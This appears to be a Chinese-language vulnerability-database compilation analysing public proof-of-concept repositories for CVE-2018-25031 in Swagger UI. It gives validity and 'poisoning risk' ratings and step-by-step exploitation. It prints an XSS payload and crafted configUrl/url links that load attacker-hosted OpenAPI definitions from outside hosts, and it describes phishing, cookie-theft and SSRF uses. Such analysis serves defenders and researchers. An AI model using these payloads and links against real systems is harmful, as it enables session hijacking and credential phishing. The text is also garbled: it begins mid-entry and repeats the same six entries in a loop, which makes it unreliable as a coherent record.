根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
4.  当用户点击该URL时，Swagger UI会加载并解析恶意JSON/YAML文件。
5.  恶意JavaScript代码会在用户的浏览器中执行，可能导致信息泄露、会话劫持或其他恶意行为。

**项目地址:** [LUCASRENAA/CVE-2018-25031](https://github.com/LUCASRENAA/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #3

**来源**: [CVE-2018-25031-RelicHunt3r_swagger-ui.md](../2018/CVE-2018-25031-RelicHunt3r_swagger-ui.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/XSS/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持和服务器端请求伪造

**影响版本:** <= 4.1.2

**利用条件:** 需要用户交互（诱骗用户点击恶意链接）

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-25031 漏洞存在于 Swagger UI 4.1.2 及更早版本中。该漏洞允许远程攻击者通过诱骗受害者打开特制的 URL 来进行欺骗攻击，从而显示远程 OpenAPI 定义。

**有效性分析：** 提供的 POC 代码通过 `configUrl` 参数加载远程配置文件，演示了HTML注入、XSS和SSRF的可能性。这些 POC 包含了用于HTML注入（伪造登录页面），XSS（执行任意 JavaScript 代码）和SSRF（如果服务器端代理请求外部文件）的payload。因此，POC 代码被认为是有效的。

**投毒风险分析：** 提供的 POC 代码指向了 `githubusercontent.com` 上的资源。虽然这些资源本身看起来是为了演示漏洞，但它们仍然存在被修改以包含恶意代码的风险。虽然代码的目的是展示漏洞利用，但潜在的风险在于如果这些文件在实际利用过程中被替换为更具攻击性的 payload，那么攻击的危害性将大大增加。考虑到目前的代码主要为演示目的，投毒风险评估为20%，主要是考虑到攻击者可能修改托管在 Github 上的 payload。

**利用方式：**

1.  攻击者构造包含 `configUrl` 或 `url` 参数的恶意 URL，该参数指向攻击者控制的 OpenAPI 定义或配置文件。
2.  攻击者诱骗受害者（例如，通过电子邮件、社交媒体等）点击此恶意 URL。
3.  受害者的浏览器加载 Swagger UI 实例，该实例从攻击者控制的 URL 加载 OpenAPI 定义或配置文件。
4.  根据攻击者提供的恶意文件内容，可以进行以下攻击：
    *   **HTML 注入/钓鱼：**  恶意文件包含 HTML 代码，用于欺骗用户输入敏感信息（例如，用户名、密码）。
    *   **XSS：** 恶意文件包含 JavaScript 代码，用于执行恶意操作（例如，窃取 cookie、重定向用户）。
    *   **SSRF：**  如果 Swagger UI 实例在服务器端获取 OpenAPI 定义，则恶意文件可以强制服务器向内部网络上的其他服务发出请求，从而暴露敏感信息或执行未经授权的操作。

**项目地址:** [RelicHunt3r/swagger-ui](https://github.com/RelicHunt3r/swagger-ui)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #4

**来源**: [CVE-2018-25031-afine-com_CVE-2018-25031.md](../2018/CVE-2018-25031-afine-com_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和用户误导

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及更高版本)

**利用条件:** 受害者需要打开一个恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031是Swagger UI中的一个欺骗攻击漏洞。通过诱骗受害者打开一个特制的URL，攻击者可以显示远程OpenAPI定义，从而可能误导用户。漏洞利用代码中的`DOMXSS.yaml`和`poc.yaml`文件包含恶意构造的OpenAPI定义，其中包括可能导致跨站脚本执行（XSS）的payload，例如`<img onerror=alert(document.domain) src>`，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。利用方式主要是通过`configUrl`或`url`参数加载远程恶意OpenAPI定义。

**有效性：**
根据提供的漏洞库信息、搜索结果和漏洞利用代码，该POC代码有效。搜索结果中提到，通过打开特制的URL可以显示远程OpenAPI定义，POC代码中的`poc.json`和相关的yaml文件提供了远程加载的OpenAPI定义，且定义中含有XSS payload，因此POC代码可以利用此漏洞。

**投毒风险：**
该仓库中存在轻微的投毒风险的可能性（5%）。`DOMXSS.yaml` 使用`<textarea><path id="</textarea><img onerror=alert(document.domain) src>`作为payload, 仅仅是alert当前document.domain, 没有更深入的恶意操作，例如上传文件或者跳转恶意网站。如果攻击者替换 `poc.json` 中的 URL，并将其指向包含恶意 JavaScript 的文件，则可能造成更大的危害，但当前提供的代码本身主要用于演示漏洞利用，而没有发现明显的后门或者恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意OpenAPI定义的YAML或JSON文件（如`poc.yaml`，`DOMXSS.yaml`）。这些定义包含XSS payload。
2.  攻击者将该文件托管在公共服务器上。
3.  攻击者构造一个包含`configUrl`或`url`参数的URL，该参数指向托管的恶意OpenAPI定义文件。例如：`/index.html?configUrl=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json` 或 `/index.html?url=https://raw.githubusercontent.com/afine-com/CVE-2018-25031/main/poc.json`
4.  攻击者诱骗受害者点击该URL。
5.  Swagger UI加载恶意OpenAPI定义，触发XSS payload，从而允许攻击者在受害者的浏览器中执行任意JavaScript代码。

**项目地址:** [afine-com/CVE-2018-25031](https://github.com/afine-com/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #5

**来源**: [CVE-2018-25031-faccimatteo_CVE-2018-25031.md](../2018/CVE-2018-25031-faccimatteo_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击/SSRF

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露或SSRF

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，实现欺骗攻击。搜索结果表明，该漏洞与SSRF有关，恶意URL的`url`参数允许展示远程OpenAPI定义。提供的POC代码包含两个文件：`test.json` 和 `test.yaml`。

*   `test.json` 文件指定了 `url` 和 `urls` 字段，指向了远程的 `test.yaml` 文件。这指示 Swagger UI 加载远程的 OpenAPI 定义。
*   `test.yaml` 文件包含一个 `description` 字段，该字段包含 HTML 代码，用于在 Swagger UI 界面上显示一个指向 `evil_website` 的链接。这表明攻击者可以控制 Swagger UI 显示的内容，从而进行欺骗。

**有效性：** 该POC代码有效。通过诱导用户点击包含指向恶意`test.json`的URL链接，Swagger UI会加载远程`test.yaml`文件，从而在UI中显示恶意链接，实现欺骗攻击。

**投毒风险：** 该POC代码的投毒风险较低，因为其主要目的是进行欺骗攻击，而非直接执行恶意代码。YAML 文件中嵌入 HTML 链接，虽然具有一定的欺骗性，但本身不包含恶意代码或后门。因此判定仓库中不存在作者隐藏的投毒代码的风险为0%。

**利用方式：**

1.  攻击者创建一个包含恶意 OpenAPI 定义（例如 `test.yaml`）的文件，并将其托管在远程服务器上。
2.  攻击者创建一个包含指向恶意 OpenAPI 定义 URL（例如 `test.json`）的 URL。
3.  攻击者诱骗受害者点击该恶意 URL。
4.  受害者的 Swagger UI 加载恶意 OpenAPI 定义，从而在界面上显示攻击者控制的内容，例如指向恶意网站的链接。

通过这种方式，攻击者可以欺骗用户，窃取敏感信息，或者利用SSRF漏洞。

**项目地址:** [faccimatteo/CVE-2018-25031](https://github.com/faccimatteo/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #6

**来源**: [CVE-2018-25031-geozin_POC-CVE-2018-25031.md](../2018/CVE-2018-25031-geozin_POC-CVE-2018-25031.md)

# CVE-2018-25031

> 📦 该CVE有 **18** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md](../2018/CVE-2018-25031-KonEch0_CVE-2018-25031-SG.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户被引导至恶意API定义，进而造成信息泄露或其他安全风险

**影响版本:** <= 4.1.2

**利用条件:** 用户需要点击攻击者构造的恶意URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。攻击者通过诱使用户打开特制的URL，可以利用此漏洞显示远程 OpenAPI 定义。漏洞的利用方式是构造一个包含指向恶意 OpenAPI 定义文件的 URL，当受害者在 Swagger UI 中打开这个 URL 时，Swagger UI 会加载并显示恶意定义文件，从而欺骗用户。漏洞利用代码`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.json`展示了如何通过`url`或`urls`参数指定远程OpenAPI定义文件的位置。`/tmp/4a3d6f006dadeb23a07d21da273d231b/main.yaml` 是一个openapi的示例，用于展示攻击效果。有效性分析：提供的POC代码通过指向远程json/yaml文件，可以实现漏洞利用，即远程加载openapi定义文件。投毒风险分析：代码中指向github仓库的文件，理论上存在被篡改的风险，从而可以投毒。投毒风险较低，可能性约为10%，因为github有commit记录，容易被溯源。攻击者可能利用这一点诱导用户访问恶意API文档，例如在API描述中包含恶意链接或误导性信息。

**项目地址:** [KonEch0/CVE-2018-25031-SG](https://github.com/KonEch0/CVE-2018-25031-SG)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #2

**来源**: [CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md](../2018/CVE-2018-25031-LUCASRENAA_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-跨站脚本攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露、会话劫持等

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者通过诱使用户打开一个精心制作的URL，可以利用此漏洞显示远程OpenAPI定义，从而可能执行恶意脚本。POC代码提供了一个Python脚本，该脚本使用Selenium自动化测试Swagger UI实例是否存在XSS漏洞，通过修改configUrl参数指向包含恶意JavaScript代码的JSON文件。虽然主要目的是测试XSS，但`sites_para_testar.txt`文件如果被替换为包含大量内网地址，则可能存在投毒风险。该脚本本身并不会主动传播恶意代码，而是依赖于目标Swagger UI实例的漏洞。由于POC依赖于外部JSON文件执行XSS，并且扫描的目标网站列表可以被修改，存在一定的投毒风险。

**漏洞利用方式：**

1.  攻击者构造一个包含恶意JavaScript代码的JSON或YAML文件，并将其托管在攻击者可控的服务器上。
2.  攻击者构造一个包含`configUrl`参数的URL，该参数指向托管恶意JSON/YAML文件的地址。例如：`http://127.0.0.1:8080/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json`
3.  攻击者诱使用户（例如，Swagger UI管理员）点击该URL。
